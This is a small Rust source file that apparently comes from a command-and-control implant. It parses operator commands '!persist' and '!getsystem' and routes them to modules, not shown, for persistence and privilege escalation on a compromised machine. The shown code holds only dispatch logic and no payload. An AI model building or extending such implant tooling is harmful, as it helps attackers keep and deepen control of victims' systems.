mod getsystem;
mod persist;

#[derive(Debug)]
pub enum C2Command {
    Persist,
    GetSystem
}

pub fn parse_command(cmd_str :&str) -> Option<C2Command> {
    match cmd_str {
        "!persist" => Some(C2Command::Persist),
        "!getsystem" => Some(C2Command::GetSystem),
        _ => None
    }
}

pub fn handle(c2_command: C2Command) -> Result<String, String> {
    use C2Command::*;
    match c2_command {
        Persist => persist::handle(),
        GetSystem => getsystem::handle()
    }
}